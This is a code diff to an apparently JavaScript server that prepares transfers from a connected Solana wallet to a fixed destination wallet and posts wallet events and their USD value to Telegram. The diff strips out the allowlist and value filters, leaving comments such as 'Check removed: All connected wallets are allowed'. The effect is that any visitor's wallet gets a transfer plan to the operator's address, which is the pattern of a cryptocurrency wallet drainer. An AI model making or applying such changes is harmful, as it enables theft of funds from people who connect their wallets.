@@ -240,8 +240,10 @@ function worthAllowed(usd) {
 }
 
 function shouldNotifyAddress(address, usd) {
-  return addressAllowed(address) && worthAllowed(usd);
+  // Always returns true so everything is allowed
+  return true;
 }
+
 
 async function sendTelegram(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -325,9 +327,8 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
     }
     const from = new PublicKey(req.params.pubkey).toBase58();
-    if (!addressAllowed(from)) {
-      return res.status(403).json({ error: 'This connected wallet is not on the allowlist' });
-    }
+// Check removed: All connected wallets are allowed
+
     const dest = new PublicKey(DEST_WALLET).toBase58();
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
@@ -416,9 +417,6 @@ app.post('/api/event', async (req, res) => {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
     }
 
-    if (!addressAllowed(event.address) || !worthAllowed(event.totalUsd)) {
-      return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
-    }
 
     if (tooSoon(clientKey(req, event), 45000)) {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'rate_limit' } });
